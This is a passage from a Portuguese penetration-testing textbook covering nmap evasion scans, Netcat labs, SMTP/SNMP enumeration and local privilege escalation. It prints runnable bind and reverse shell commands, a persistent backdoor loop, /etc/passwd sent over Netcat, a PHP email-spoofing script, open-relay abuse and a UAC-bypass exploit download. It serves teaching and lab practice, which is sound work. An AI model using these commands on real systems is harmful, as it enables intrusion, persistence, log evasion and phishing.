vo\t(-A)\n.\tEssa\tvarredura\tdetermina\tdetalhes\nsobre\to\tsistema\toperacional,\tversão\tde\tserviço\tetc.\nroot@kali#\n\tnmap\t192.168.1.102\t\n–A\n20\n.\t\nTécnica\tde\tdespiste\n.\tA\ttécnica\tde\tdespiste\tconsiste\tem\tefetuar\tscans\tcom\nendereços\tIPs\tde\torigem\tdiferentes.\tNo\tmomento\tem\tque\tfor\tconsultado\to\nlog\tno\tservidor,\thaverá\to\tIP\tdo\tatacante,\tmas\ttambém\thaverá\toutros\tIPs,\npodendo\tconfundir\to\tadministrador,\tpois\teste\tficará\tem\tdúvida\tde\tqual\tIP\tele\nrealmente\tefetuou\to\tscanning.\nroot@kali#\n\tnmap\t192.168.1.102\t\n–D\t6.6.6.6,192.168.1.1\n21\n.\t\nIP\tSpoofing\n.\tDiferentemente\tda\ttécnica\tde\tdespiste,\ta\ttécnica\tde\tIP\nSpoofing\tenvia\tum\tpacote\tcomo\tsendo\tuma\torigem\tfalsa\te\tnão\tinclui\to\tIP\tdo\natacante\tno\tmomento\tdo\tscan,\tporém,\tpor\tparecer\tmais\tvantajoso,\tesse\ttipo\nde\ttécnica\tapenas\tenvia\to\tpacote,\tnão\trecebe\tnenhum\tretorno\t(Para\tmais\ndetalhes\tsobre\ta\treal\tutilidade\tdo\tIP\tSPoofing,\tconsulte\to\tcapítulo\t15,“DoS\t–\nDenial\tof\tService”).\nroot@kali#\n\tnmap\t192.168.1.1\t\n–S\t6.6.6.6\t–e\teth0\n22\n.\t\nVarredura\tFTP\tBounce\n.\tExplora\tuma\tfalha\tem\tservidores\tFTP\tmal\nconfigurados,\tque\tpermite\t(por\tmeio\tdo\tcomando\t\nPORT\t\nno\tFTP)\tque\nrequisições\tenviadas\tao\tFTP\tem\tdeterminada\tporta\tsejam\tredirecionadas\tpara\num\thost\tqualquer\tnaquela\tporta.\tOu\tseja,\té\tpossível\trealizar\tuma\tvarredura\tde\nportas\tna\tmáquina\tABC\toriginando\tminhas\tconexões\tpelo\tservidor\tFTP.\tE,\nquando\to\tadministrador\tde\tABC\tchecar\tos\tlogs,\tadivinhe\tqual\tserá\to\tIP\tque\nestará\tregistrado\tcomo\tatividade\tde\tvarredura\tde\tportas?\n2\n.\tVamos\tutilizar\to\nnosso\tservidor\tWindows\t(IP\t192.168.1.101)\tcomo\to\tnosso\tproxy\tFTP\tpara\nescanearmos\to\tIP\tdo\tnosso\troteador\t(192.168.1.1).\nroot@kali#\n\tnmap\t192.168.1.1\t\n-Pn\t-p\t80\t-b\t192.168.1.101\nLembre-se\tde\tativar\ta\topção\t\n–Pn\n\tpara\trealizar\tuma\tvarredura\tsem\tping.\n\tNota:\n\to\tescaneamento\tpela\ttécnica\tFTP\tBounce\tpode\tser\tbem\tdemorado,\tentão\tfaça\to\tescaneamento\napenas\tdas\tprincipais\tportas\tde\tseu\talvo.\n\t\n23\n.\t\nEnvio\tde\tpacotes\tfragmentados\n.\tÚtil\tpara\tse\tevadir\tde\tIDS\t–\tSistemas\tde\nDetecção\tde\tIntruso.\nroot@kali#\n\tnmap\t192.168.1.102\t\n-f\n24.\n\t\nDetecção\tdo\tsistema\toperacional\n.\tPara\ta\tdetecção\tdo\tsistema\toperacional,\no\tNmap\tenvia\tpacotes\tpara\to\tseu\talvo,\te\ta\tresposta\té\tcomparada\tcom\ta\tbase\nde\tdados\tdo\tNmap,\tdeterminando\ta\tversão\tdaquele\tsistema\toperacional.\nroot@kali#\t\nnmap\t192.168.1.102\t\n–O\nroot@kali#\t\nnmap\t192.168.1.102\t\n–O\t--osscan-guess\n25\n.\t\nDetecção\tde\tbanner\n.\tA\tdetecção\tde\tbanner\tpermite\tsaber\tcom\tmais\ndetalhes\tqual\té\ta\tversão\tdaquele\tdeterminado\tserviço\t(versão\tdo\tApache,\nSSH\tetc.).\nroot@kali#\t\nnmap\t192.168.1.102\t\n–sV\n7.4\tO\tcanivete\tsuíço\tNetcat\nConhecido\tcomo\to\tcanivete\tsuíço\tdo\tTCP/IP,\to\tNetcat\té\tutilizado\tpara\tmuitas\nfunções\tpara\tadministração\tde\tredes.\tSuas\tfuncionalidades\tincluem\tdesde\tport\nscan\taté\ta\tcriação\tde\tbackdoors.\n•\tPara\tinstalar\to\tNetcat\tno\tDebian:\nroot@debian#\t\napt-get\tinstall\tnetcat\n•\tPara\tinstalar\to\tNetcat\tno\tWindows,\trealize\to\tdownload\tdo\tbinário\tem\nhttp://packetstormsecurity.com/files/download/101512/rcat.zip\nDentro\tdo\tarquivo\t\nrcat.zip\n\thaverá\to\trcat\t(nc\treprogramado)\te\to\tnc\toriginal.\nOpções:\n-e\t\ncmd\nExecuta\to\tcomando\tespecificado.\n-l\nCom\tessa\topção,\to\tnetcat\tfica\tesperando\tpor\tconexões.\tDeve\tser\tcombinado\tcom\ta\topção\t\n-p\n.\n-p\t\nporta\nPorta\ta\tser\tusada\tquando\ta\topção\t\n–l\n\tfor\tselecionada.\n-s\t\nIP\nEndereço\tIP\tde\torigem.\nHabilita\to\tprotocolo\tUDP\tem\tvez\tdo\tTCP.-u\n-v\nModo\tdetalhado.\n-z\nUtilizado\tcomo\tport\tscanner.\n7.4.1\tLaboratório\tNetcat\nPara\tos\tlaboratórios,\tdesabilite\to\tfirewall\tdo\tWindows.\n1\n.\tCriar\tum\tsocket.\tUm\tsocket\té\tum\tcanal\tde\tcomunicação\tentre\to\tatacante\te\ta\nsua\tvítima.\tNeste\tprimeiro\texemplo,\to\tsocket\té\tsimples.\nroot@debian#\t\nnc\t–l\t–p\t12345\t–vv\nroot@kali#\t\nnc\t192.168.1.102\t12345\nDigite\tqualquer\tcoisa\tno\tNetcat\tdo\tKali\tLinux\tpara\ta\tmensagem\tser\tecoada\tno\nNetcat\tdo\tDebian.\nDigite\tqualquer\tcoisa\tno\tNetcat\tdo\tDebian\tpara\ta\tmensagem\tser\tecoada\tno\nNetcat\tdo\tKali\tLinux.\n2\n.\tTransferir\tarquivos\n•\tMáquina\tque\tvai\treceber\to\tarquivo\nroot@kali#\t\nnc\t–vv\t–l\t–p\t123\t>\trecebido\n•\tMáquina\tque\tvai\tenviar\to\tarquivo\nroot@debian#\t\nnc\t192.168.1.100\t123\t–vv\t<\t/etc/passwd\n3\n.\tCriar\tbackdoor\t(Linux)\nroot@debian#\t\nnc\t–v\t–l\t–p\t123\t–e\t/bin/bash\nroot@kali#\t\nnc\t–vv\t192.168.1.102\t123\nA\tdiferença\tentre\tum\tsocket\te\tuma\tbackdoor\té\tque,\tna\tbackdoor,\tos\tcomandos\nsão\tecoados\t(com\ta\topção\t\n–e\n)\tpara\to\tshell\tdo\tsistema\t(\n/bin/bash\n\tno\tLinux\te\ncmd.exe\n\tno\tWindows).\n4\n.\tCriar\tbackdoor\tpersistente\t(Linux)\nroot@debian#\twhile\ttrue;\tdo\t\nnc\t–v\t–l\t–p\t123\t–e\t/bin/bash\n;\tdone\nroot@kali#\nnc\t–vv\t192.168.1.102\t123\nDigite\tCtrl+C\nroot@kali#\t\nnc\t–vv\t192.168.1.102\t123\n5\n.\tCriar\tbackdoor\t(Windows)C:\\\t\nnc.exe\t–v\t–l\t–p\t123\t–e\tcmd.exe\nroot@kali#\t\nnc\t192.168.1.101\t123\n6\n.\tConexão\treversa\nNesse\ttipo\tde\tconexão,\ta\tmáquina\tvítima\tse\tconecta\tà\tmáquina\tatacante\tem\nvez\tde\ta\tmáquina\tatacante\tse\tconectar\tà\tmáquina\tvítima\t(conexão\tdireta),\nrealizando\tuma\tconexão\treversa.\nAs\tconexões\treversas\tsão\tutilizadas\tpara\tburlar\tregras\tde\tfirewall.\tPor\nexemplo:\tem\tuma\tmáquina\tWindows\tcom\tfirewall,\ta\tconexão\treversa\npossibilita\tum\tcanal\tde\tcomunicação\tentre\tatacante\te\tvítima,\tsem\tque\to\nfirewall\tda\tvítima\tperceba\tessa\tconexão.\nPara\tesse\texemplo,\thabilite\to\tfirewall\tdo\tWindows.\nCrie\tdois\tsockets\tna\tmáquina\tdo\tKali\tLinux.\nroot@kali#\t\nnc\t–v\t–l\t–p\t123\nroot@kali#\t\nnc\t–v\t–l\t–p\t456\nNa\tmáquina\tWindows\nC:\\\n\tnc.exe\t192.168.1.100\t123\t|\tcmd.exe\t|\tnc.exe\t192.168.1.100\t456\nO\texemplo\tanterior\tdiz\to\tseguinte:\tNetcat\tconecte-se\tà\tmáquina\tKali\tLinux\tna\nporta\t123\t(um\tsocket\tbidirecional,\tconvencional\tda\tmáquina\tda\tvítima\taté\ta\nmáquina\tdo\tatacante).\tTudo\to\tque\to\tatacante\tdigitar\tno\tKali\tLinux\tenvie,por\nmeio\tdo\tPipe,\tpara\to\t\ncmd.exe\n\t(terminal\tde\tcomandos\tdo\tWindows).\tOu\tseja,\ncaso\to\tatacante\tdigite\t\ndir\n\tno\tKali\tLinux,\to\tWindows\tvai\tinterpretar\tesse\ncomando\te\tenviá-lo\tao\t\ncmd.exe\n,\te\tfará\ta\tlistagem\tdos\tarquivos.\tFeito\tisso,\njogue\to\tresultado\tdo\t\ncmd.exe\n\t(listagem\tdos\tarquivos)\tpara\tum\tsegundo\nsocket\tque\testá\tna\tmáquina\tdo\tatacante\t(listando\tna\tporta\t456).\tCom\tisso,\to\natacante\tdigita\t\ndir\n\tno\tprimeiro\tsocket,\to\tWindows\tda\tvítima\tinterpreta\tesse\ncomando\te\texibe\ta\tsaída\tno\tsegundo\tsocket.\nA\tconexão\treversa\tpode\tser\tvisualizada\tna\tfigura\t7.6.\nOutra\tforma\tde\trealizar\ta\tconexão\treversa\té\tlistar\tum\tsocket\tno\tKali\tLinux\te\nconectá-lo\tdiretamente\tcom\to\tWindows\t(como\to\tsocket\té\tbidirecional,\to\tque\nfor\tdigitado\tno\tKali\tLinux\tserá\tenviado\tpela\topção\t\n-e\n\tao\tshell\tde\tcomandos\ndo\tWindows.\nroot@kali#\n\tnc\t-l\t-p\t123\t-vv\nC:\\\t\nnc\t192.168.1.100\t123\t-e\tcmd.exeFigura\t7.6\t–\tConexão\treversa\texecutada\tcom\tsucesso.\n7\n.\tPortScanner\nroot@debian#\t\nservice\tssh\tstart\nroot@\tdebian#\t\nservice\tapache2\tstart\nroot@kali#\n\tnc\t–v\t192.168.1.102\t–z\t21-81\n8\n.\tEnumeração\tde\tbanners\nroot@kali#\t\nnc\t192.168.1.102\t80\nHEAD\t/\tHTTP/1.1\nPressione\tEnter\n9\n.\tEnumeração\tde\tbanners\t(HTTPS)\nO\tnetcat\tnão\tconsegue\trealizar\tconexões\tsobre\tprotocolos\tcriptografados,\ncomo\to\tHTTPS.\tPara\tisso,\tvamos\tutilizar\to\tcliente\topenssl.\nroot@kali#\t\nopenssl\ts_client\t-quiet\t-connect\twww.microsoft.com:443\nHEAD\t/\tHTTP/1.1\nEnter\nO\tKali\tLinux\ttambém\tpossui\tuma\tversão\tdo\tnetcat\tlocalizada\tem\n/usr/share/windows-binaries/nc.exe\n.\n7.5\tEnumeração\tSMTP\nO\tprotocolo\tSMTP\t(Simple\tMail\tTransfer\tProtocol)\té\tresponsável\tpelas\nmensagens\tde\temail.\tAs\tmensagens\tde\temail\tsão\tenviadas\tvia\tSMTP\te\nposteriormente\tacessadas\tpelo\tprotocolo\tPOP3\tou\tIMAP4.7.5.1\tLaboratório\temail\nInstale\to\tservidor\tPostfix\tno\tDebian.\nroot@debian#\t\napt-get\tinstall\tpostfix\nAs\tpossíveis\tconfigurações\tpara\ta\tinstalação\tdo\tPostfix\tsão:\n•\t\nNo\tconfiguration\n\t–\tAs\tconfigurações\tdo\tPostfix\tserão\tmantidas.\n•\t\nInternet\tsite\n\t–\tAs\tmensagens\tserão\tenviadas\tvia\tSMTP.\n•\t\nInternet\twith\tsmarthost\n\t–\tAs\tmensagens\tserão\tenviadas\tvia\tSMTP\tou\tvia\nalgum\tutilitário\tcomo\to\tFetchmail.\n•\t\nSatellite\tsystem\n\t–\tAs\tmensagens\tde\temail\tsão\ttransmitidas\tpor\toutra\nmáquina,\tum\tsmarthost.\n•\t\nLocal\tonly\n\t–\tApenas\to\thost\tlocal\tvai\tenviar\te\treceber\tmensagens.\nSerá\trealizada\ta\tinstalação\t“\ninternet\tsite\n”\tpara\tque\to\tnosso\tservidor\tpossa\nreceber\te\tenviar\tmensagens\tda\tnossa\trede.\nDeverá\tser\tconfigurado\to\tdomínio\tDNS\tpara\tenvio\te\trecebimento\tde\temails.\nComo\to\tnosso\tservidor\tDNS\té\t\nkali.com.br\n,\tconfigure-o\tdentro\tda\topção\t\nSystem\nmail\tname\n\tdo\tPostfix.\n•\tFaça\tum\tbackup\tdo\tarquivo\t\n/etc/postfix/main.cf\n\tantes\tde\trealizar\tqualquer\nalteração:\nroot@debian#\t\ncp\t/etc/postfix/main.cf\t/etc/postfix/main.cfOLD\n•\tAltere\to\tarquivo\t\n/etc/postfix/main.cf\n\tcom\ta\tseguinte\tconfiguração:\nmydomain\t=\tkali.com.br\nmyorigin\t=\t$mydomain\nmydestination\t=\t$mydomain\nmynetworks_style\t=\tsubnet\nhome_mailbox\t=\tMaildir/\n•\tInstale\to\tservidor\te\tCourier-IMAP:\nroot@debian#\t\napt-get\tinstall\tcourier-imap\nCaso\tdeseje,\tinstale\to\tCourier-webadmin\t(utilizado\tpara\tadministrar\to\tCourier)\n–\tparticularmente\teu\tnão\tinstalo\t–,\tselecionando\to\tcampo\t\n<No>.\n•\tInstale\to\tservidor\te\tCourier-POP:\nroot@debian#\t\napt-get\tinstall\tcourier-popSerá\tnecessário\tcriar\tuma\tpasta\t\nMaildir\n\tpara\tcada\tusuário\tdo\tsistema\tque\tqueira\nreceber\te\tenviar\temails.\tRepita\to\tprocedimento\ta\tseguir\tpara\tcada\tusuário.\n-------------------------------------------------------------------------------------------------\n-------\nProcedimento\tpara\tcriação\tde\tuma\tpasta\tde\temail\tpara\tqualquer\tusuário\n•\tLogue\tno\tsistema\tcom\to\tusuário\tque\tterá\tuma\tconta\tde\temail:\nroot@debian#\t\nlogin\troot\n•\tVá\tao\tseu\tdiretório\thome:\nroot@debian#\t\ncd\t$HOME\n•\tCrie\ta\tpasta\t\nMaildir:\nroot@debian#\t\nmaildirmake\tMaildir\n•\tO\tdono\te\to\tgrupo\tda\tpasta\t\nMaildir\n\tdeve\tser\to\tmesmo\tdo\tseu\tusuário:\nroot@debian#\t\nls\t-lhad\tMaildir\n-------------------------------------------------------------------------------------------------\n-------\n•\tComo\tusuário\troot,\tdeverão\tser\trealizados\tos\tprocedimentos\ta\tseguir\tpara\nconfiguração\tdo\tSquirrelMail:\nroot@debian#\t\napt-get\tinstall\tsquirrelmail\nroot@debian#\t\ncp\t/etc/squirrelmail/apache.conf\t/etc/apache2/conf.d/squirrelmail.conf\nroot@debian#\t\nservice\tpostfix\trestart\nroot@debian#\t\nservice\tcourier-imap\trestart\nroot@debian#\t\nservice\tapache2\trestart\n•\tConfigure\to\tarquivo\t\n/etc/resolv.conf\n\tdo\tDebian\tpara\tque\teste\treconheça\to\tseu\nDNS:\nnameserver\t192.168.1.102\nsearch\tkali.com.br\n•\tVerifique\tse\to\tDebian\tassocia\to\tnome\tao\tservidor\tDNS\tcom\tNslookup:\nroot@debian#\t\nnslookup\tkali.com.br\n•\tCom\to\tnavegador\tacesse:\nhttp://192.168.1.102/squirrelmail\nO\tusuário\te\ta\tsenha\tpara\tlogin\tdo\tSquirrelMail\tsão\tos\tusuários\te\tas\tsenhascadastrados\tno\tDebian.\n•\tCrie\tum\tusuário\tteste\tno\tDebian:\nroot@debian#\t\nadduser\tteste\nRepita\to\tprocedimento\tpara\tcriar\tuma\tpasta\tpara\tque\to\tusuário\tteste\treceba\nemails.\nEnvie\tum\temail\tpara\t\nteste@kali.com.br\t\ne\tverifique\tse\to\tsistema\tde\temail\testá\tok.\n7.5.2\tSTMPUser\tenum\nO\tprotocolo\tSMTP\tpermite,\tpor\tmeio\tdos\tcomandos\t\nVRFY\n,\ta\tverificação\tde\nnomes\tde\tusuários\tválidos\tcadastrados\tno\tsistema.\nConfigure\to\tarquivo\t\n/etc/resolv.conf\n\tdo\tKali\tLinux\tpara\tque\to\tarquivo\treconheça\no\tservidor\tDNS\tdo\tDebian.\tVerifique\tpor\tmeio\tdo\tdnsenum\tse\to\tKali\tLinux\nreconhece\to\tservidor\tDNS.\nRealize\ta\tenumeração\tdos\tusuários\tpor\tmeio\tdo\tsmtp-user-enum:\nroot@kali#\n\tsmtp-user-enum\t-M\tVRFY\t-U\t/root/Desktop/nomes\t-t\tkali.com.br\n7.5.3\tComo\tenviar\temails\tfalsos\t(via\tPHP)\nO\tprotocolo\tSMTP\tnão\texige\tautenticação\te\tnão\tnecessita\tda\tverificação\tdos\ncabeçalhos\tpara\tsaber\tse\to\tremetente\tda\tmensagem\trealmente\té\tquem\tdiz\tser.\nPor\tcausa\tdesse\ttipo\tde\testruturação\tdo\tpacote\tSMTP,\teste\tpermite\to\tenvio\tde\nemails\tfalsos.\n•\tInicie\to\tservidor\tApache:\nroot@debian#\n\tservice\tapache2\tstart\n•\tConfigure\to\tarquivo\t\n/etc/resolv.conf\n\tdo\tDebian:\nnameserver\t192.168.1.102\nsearch\tkali.com.br\n•\tCrie\to\tarquivo\t\n/var/www/fakemail.php\n\tno\tDebian\tcom\to\tseguinte\tconteúdo:\n<?php\n$from\t=\t\"fakemail@kali.com.br\";\n$to\t=\t\"teste@kali.com.br\";\n$subject\t=\t\"Fake\tmail\";\n$message\t=\t\"Email\tfalso.\tComo\tse\tpode\tver,\to\tusuario\tfinal\tfakemail\tnao\texiste,\tmas\tenvio\temail\tno\nnome\tdele\";\n$headers\t=\t\"From:\"\t.\t$from;$headers\t=\t\"From:\"\t.\t$from;\nmail($to,$subject,$message,$headers);\necho\t\"Email\tenviado.\";\n?>\nComo\tapresentado\tpelo\tscript\tPHP,\tnão\té\tnecessário\tter\tautenticação\tpara\nenvio\tde\temail\tdo\tusuário\t\nfakemail@kali.com.br\n.\tO\tusuário\t\nfakemail\n\tnão\tfaz\nparte\tdo\tsistema,\tporém\tpodemos\tenviar\temail\tnormalmente\tem\tseu\tnome.\nIsso\té\tvalido\tpara\tqualquer\toutra\tconta\tde\temail.\tPor\texemplo:\nfakemail@kali.com.br\n,\tou\t\nroot@kali.com.br\n,\tou\nusuario@qualquerdominio.com\n.\n•\tAcesse\t\nhttp://192.168.1.102/fakemail.php\n.\n•\tAbra\to\tSquirrelMail\tcomo\tusuário\tteste\tpara\tver\to\temail\trecebido,\tconforme\nmostra\ta\tfigura\t7.7.\nFigura\t7.7–\tEmail\tfalso\tenviado\tcom\tsucesso\tao\tusuário\tteste.\n7.5.4\tComo\tenviar\temails\tfalsos\t(via\tOpen\tRelay)\nServidores\tque\tutilizam\to\tserviço\tde\tSMTP\ttambém\tsão\tvulneráveis\ta\tataques\tde\nenvio\tde\temail\tfalso.\tNo\tpassado\tnão\tera\tincomum\tencontrar\tservidores\tde\temail\nque\tpermitiam\ta\tsua\tconexão\tremota,\te,\tcom\talguns\tcomandos,\to\tatacante\nconseguia\tenviar\temails\tfalsos\tem\tnome\tdaquele\tservidor.\tHoje\tessa\ttarefa\té\nmuito\trara\tem\tservidores\tcom\tacesso\tà\tinternet,\tisso\tdevido\ta\tmecanismos\tde\nsegurança\te\tao\tbloqueio\tda\tporta\t25.\tEsse\tcenário\té\tmais\ttípico\tem\tuma\trede\ninterna,\tem\tque\talgum\tadministrador\tpode\tter\tse\tesquecido\tde\tdesabilitar\talgum\nservidor\tSMTP.\nMesmo\tsendo\traro\te\tdifícil\tde\tencontrar,\tcaso\to\tleitor\tdepare-se\tcom\tum\tservidor\nde\temail\tque\tpermite\tenviar\temails\tsem\tnenhum\tmecanismo\tde\tautenticação\n(esses\tservidores\tsão\tchamados\tde\tOpen\tRelay),\ttestar\tesse\tservidor\té\tcrucial\temum\tpentest.\tIsso\tporque\tservidores\tOpen\tRelay\trepresentam\tuma\tfalha\ngravíssima.\n•\tConecte-se\tno\tservidor\tSMTP\tna\tsua\tporta\tde\tescuta\t(normalmente\t25):\nroot@kali#\t\nnc\t192.168.1.102\t25\n•\tDigite\tos\tseguintes\tcomandos:\nhelo\t192.168.1.102\nmail\tfrom:\topen_relay@kali.com.br\nrcpt\tto:\tteste@kali.com.br\ndata\nFrom:\topen_relay@kali.com.br\nTo:\tteste@kali.com.br\nSubject:\tEmail\nEmail\tenviado\tcom\tsuccesso\tvia\tOpen\tRelay\n.\nquit\nObserve\tque\tnão\tfoi\texibida\tnenhuma\tmensagem\tde\terro\tou\tmesmo\tqualquer\nmensagem\tem\tque\tnão\té\tpermitido\tao\tusuário\tenviar\temails.\tFinalize\ta\nmensagem\tcom\tum\tponto\t(.).\nA\tfigura\t7.8\tmostra\tesse\tprocesso.\nFigura\t7.8\t–\tEmail\tenviado\tvia\tOpen\tRelay.\n7.6\tEnumeração\tSNMP\nO\tprotocolo\tSNMP\tpermite\tcoletar\tinformações\tdos\tequipamentos.\tPor\nexemplo,\tpor\tmeio\tdo\tSNMP\té\tpossível\tsaber\to\tconsumo\tde\tCPU,\tportas\nabertas,\tprocessos\tativos\tetc.\tApresenta\tdois\tcomponentes:\to\tagente\tSNMP\te\to\ngerente\tSNMP.\tO\tagente\tSNMP\té\tum\tsoftware\tcuja\tfunção\té\tinformar\to\testadodo\tequipamento\t(uso\tda\tCPU,\tportas\tabertas\tetc.).\tO\tgerente\tSNMP\té\tum\nsoftware\tque\tvai\trequisitar\tas\tinformações\tdos\tagentes.\tOs\tgerentes\tmais\nconhecidos\tsão:\tOpenView,\tUniCenter,\tOpenNMS\te\tMRTG.\n12\nA\tprincipal\tvulnerabilidade\tdo\tSNMP\tgira\tem\ttorno\tda\tdescoberta\tda\tsenha\tda\ncomunidade\t(uma\tespécie\tde\tautenticação\trealizada\tpelo\tSNMP),\tou\tseja,\tquem\npossui\ta\tsenha\tda\tcomunidade\tconsegue\tautenticar-se\tno\tagente\tSNMP\te\tobter\nos\tdados\tSNMP.\tO\tpior\tproblema\té\ta\tescolha\tdessa\tsenha,\tque\tnormalmente\té\nfácil\tde\tadivinhar\tou,\tainda,\tna\tmaioria\tdas\tvezes,\tos\tadministradores\tutilizam\ta\nsenha\t“public”.\tVamos\tentão\tinstalar\to\tsoftware\tagente\tno\tservidor\tDebian\te\ndefinir\ta\tsenha\tpublic\tpara\texplorarmos\tessa\tfalha.\n•\tPara\tinstalar\to\tsoftware\tagente\tno\tservidor\tDebian:\nroot@debian#\t\napt-get\tinstall\tsnmpd\nO\tarquivo\t\n/etc/snmp/snmpd.conf\n\tdeve\tficar\tcom\to\tseguinte\tconteúdo:\ncom2sec\t\tlocal\t\t\tlocalhost\t\t\t\t\t\t\tprivate\ncom2sec\t\tmynet\t\t\t192.168.1.0/24\t\tpublic\ncom2sec\t\tpublic\t\tdefault\t\t\t\t\t\t\t\t\tpublic\ngroup\tmygroup\t\t\tv1\t\t\t\t\t\t\t\tmynet\ngroup\tmygroup\t\t\tv2c\t\t\t\t\t\t\tmynet\ngroup\tlocal\t\t\t\t\tv1\t\t\t\t\t\t\t\tlocal\ngroup\tlocal\t\t\t\t\tv2c\t\t\t\t\t\t\tlocal\ngroup\tpublic\t\t\t\tv1\t\t\t\t\t\t\t\tpublic\ngroup\tpublic\t\t\t\tv2c\t\t\t\t\t\t\tpublic\nview\tall\t\t\t\tincluded\t\t.1\t\t\t80\naccess\tmygroup\t\"\"\tany\tnoauth\t0\tall\tnone\tnone\naccess\tpublic\t\"\"\tany\tnoauth\t0\tall\tnone\tnone\naccess\tlocal\t\"\"\tany\tnoauth\t0\tall\tall\tall\nsyslocation\tUnknown\t(edit\t/etc/snmp/snmpd.conf)\nsyscontact\tRoot\t<root@kali.com.br>\t(configure\t/etc/snmp/snmp.local.conf)\nReinicialize\to\tserviço\tde\tSNMP:\nroot@debian#\t\nservice\tsnmpd\tstop\nroot@debian#\t\nservice\tsnmpd\tstart\n7.6.1\tSNMPcheck\nUtilizado\tpara\tmapeamento\tde\tSNMP:\nroot@kali#\n\tsnmpcheck\t–t\t192.168.1.1027.6.2\tOneSixtyOne\nOutra\topção\tpara\tmapeamento\tSNMP.\tO\tOneSixtyOne\tpermite\tvarredura\tsobre\numa\trede\tinteira,\tutilizar\tum\tarquivo\tpara\tdeterminar\ta\tsenha\tda\tcomunidade\tetc.\nOpções:\n-c\t\nsenhas\nArquivo\tcontendo\tas\tprováveis\tsenhas\tda\tcomunidade.\n-i\t\nmáquinas\nArquivo\tcom\tas\tmáquinas\ta\tserem\ttestadas.\nExemplos\tde\tuso:\nroot@kali#\n\tonesixtyone\t192.168.1.102\tpublic\nroot@kali#\n\tonesixtyone\t-c\tsenhas\t192.168.1.102\nroot@kali#\n\tonesixtyone\t-c\tsenhas\t-i\tmaquinas\n1\n\tVoIP\té\tacrônimo\tpara\tVoz\tsobre\tIP.\tÉ\tum\tprotocolo\tque\tpermite\ta\ttransmissão\tda\tvoz\thumana\tpela\ninternet.\tCom\to\tVoIP\té\tpossível\tfazer\tchamadas\ttelefônicas\tpela\tinternet.\tChamadas\tde\tVoIP\tpara\tVoIP\nsão\tgratuitas,\tchamadas\tde\tVoIP\tpara\ttelefones\tfixos\tou\tmóveis\tsão\tpagas.\tUm\texemplo\tde\tprograma\nVoIP\té\to\tSkype.\n2\n\tPara\tesse\tlaboratório\té\tnecessário\to\tservidor\tEasyFTP\tv.7.0.11\t(permite\tpor\tnatureza\tataques\tde\tFTP\nBounce),\tencontrado\tem\t\nhttp://www.exploit-db.com/exploits/14402/\n.CAPÍTULO\n\t8\nMapeamento\tde\tvulnerabilidades\nMapeamento\tde\tvulnerabilidades\tconsiste\tna\tidentificação\te\tanálise\tdas\npossíveis\tvulnerabilidades.\tUma\tvez\tque\tas\tetapas\tde\tcoleta\tde\tinformação,\ndescobrimento,\tenumeração\tdos\talvos,\tserviços\te\tportas\tforam\tefetuados,\testá\tna\nhora\tde\tinvestigar\tas\tpossíveis\tvulnerabilidades\tque\texistem\tno\talvo\tque\tpoderão\ncomprometer\ttoda\ta\trede\tem\tquestão.\nÉ\timportante\tnotar\ta\tdiferença\tentre\to\tteste\tmanual\te\to\tteste\tcom\tferramentas\nautomatizadas.\tMuitas\tvezes\to\tteste\tcom\tferramentas\tautomatizadas\tproduz\nresultados\tfalsos\tpositivos,\talém\tde\tpoder\tfalhar\tem\talguns\tcasos,\tcomo\ta\ndeterminação\tde\terros\tlógicos\t(SQL\tInjection,\tXSS)\te\tvulnerabilidades\tnão\nabertas\tao\tconhecimento\tpúblico\t(por\texemplo:\to\tauditor\tpode\tdescobrir\tum\nCode\tExecution\tem\tum\tsoftware\te\tdesenvolver\tum\texploit\tespecífico).\tDesse\nmodo\té\timportante\to\tauditor\tter\tconhecimento\ttanto\tdo\tuso\tde\tferramentas\nautomatizadas\tcomo\tdo\tteste\tmanual.\n8.1\tTipos\tde\tvulnerabilidades\nÉ\timportante\tentender\te\testudar\ta\tclassificação\tde\tvulnerabilidades\tque\texistem\nantes\tde\tcomeçar\ta\tutilizar\tas\t\nferramentas\tque\tdetectam\tfalhas.\tEste\tlivro\tnão\ntem\tcomo\tobjetivo\tapresentar\te\tnem\tdescrever\tos\tdiversos\ttipos\tde\tfalhas\tque\num\tsistema\tapresenta:\tBuffer\tOverflow,\tRace\tCondition,\tStack\tOverflow,\nRemote\tCode\tExecution\tetc.\tO\testudo\tsobre\tesses\ttipos\tde\tfalhas\té\nextremamente\tavançado\te\trequer\tum\tconhecimento\televado\tsobre\tprogramação,\nlinguagens\tde\tbaixo\tnível\te\tsistema\toperacional.\tVamos\ttratar\tas\nvulnerabilidades\tde\tmaneira\tmais\tsimplória\t(o\tsuficiente\tpara\trealização\tde\tum\npentest).\tAs\tvulnerabilidades\tpodem\tser\tclassificadas\tem\tdois\ttipos:\tlocal\te\nremota.\n8.1.1\tVulnerabilidade\tlocal\nA\tvulnerabilidade\té\texplorada\tde\tmaneira\tlocal.\tÉ\tnecessário\tque\to\texploit\tseja\nexecutado\tlocalmente\tna\tmáquina\talvo.\tNormalmente\tesse\ttipo\tdevulnerabilidade\té\texecutada\tcom\to\tobjetivo\tde\taumentar\to\tprivilégio\tde\tacesso.\nPor\texemplo:\to\tusuário\tA\ttem\tacesso\tlimitado\tà\tsua\tmáquina\te,\tde\talguma\nforma,\tele\tdeseja\taumentar\to\tseu\tnível\tde\tacesso\tpara\tadministrador.\tUma\nmaneira\tde\tse\tfazer\tisso\té\texecutando\tum\texploit.\nOutro\texemplo\té\to\tusuário\texecutar\tlocalmente\tum\tarquivo\tMicrosoft\tOffice\nmalicioso.\nWindows\tUAC\tbypass\nHá\tuma\tvulnerabilidade\tno\tKernel\tdo\tWindows\tque\tpermite\tque\tusuários\tlocais\nconsigam\to\tacesso\tde\tautoridade\t(usuário\t\nnt\tauthority\\System\n)\tna\tmáquina.\nO\tUAC\t(User\tAccount\tControl)\té\tum\tsistema\tde\tcontrole\timplementado\tdesde\to\nWindows\tVista,\tque\timpede\tque\tusuários\tcom\tpoucos\tprivilégios\tfaçam\nalterações\tde\talto\trisco\tno\tWindows,\tcomo\tinstalar\tum\tprograma\tou\tacessar\ndiretórios\tsem\ta\tdevida\tpermissão.\tO\tsistema\tUAC\té\tmostrado\tna\tfigura\t8.1.\nFigura\t8.1\t–\tSistema\tUAC.\nO\tsistema\ttestado\té\tum\tWindows\t7\tsp0\t32bits.\nCrie\tum\tusuário\tcom\tpoucos\tprivilégios\te\tacesse\to\tsistema\tno\tnome\tdele.\nO\texploit\tencontra-se\tno\tendereço\t\nhttp://www.exploit-db.com/sploits/uacpoc.zip.\nBaixe\to\t\nexploit\n\te\texecute-o\tno\tWindows.\tVeja\to\tseu\tprivilégio\tsendo\tescalonado\